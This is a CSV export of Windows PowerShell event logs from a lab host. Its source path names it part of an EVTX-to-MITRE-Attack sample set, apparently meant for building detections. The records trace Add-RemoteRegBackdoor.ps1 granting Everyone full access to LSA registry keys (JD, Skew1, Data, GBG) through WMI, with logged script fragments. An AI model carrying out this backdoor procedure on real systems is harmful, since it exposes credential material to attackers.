name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring completed for key\""\n"",""Binary"":""""}}"
21,54725,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1053\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring started for key\""\n"",""Binary"":""""}}"
22,54726,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1055\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
23,54727,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1057\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
24,54728,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1059\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
25,54729,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1061\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
26,54730,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1063\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
27,54731,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1065\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
28,54732,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1067\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring completed for key\""\n"",""Binary"":""""}}"
29,54733,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1069\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Backdooring started for key\""\n"",""Binary"":""""}}"
30,54734,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1071\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
31,54735,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1073\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
32,54736,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1075\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
33,54737,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1077\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
34,54738,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1079\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
35,54739,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1081\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
36,54740,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1083\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Backdooring completed for key\""\n"",""Binary"":""""}}"
37,54741,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1085\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring started for key\""\n"",""Binary"":""""}}"
38,54742,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1087\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
39,54743,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1089\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
40,54744,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1091\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
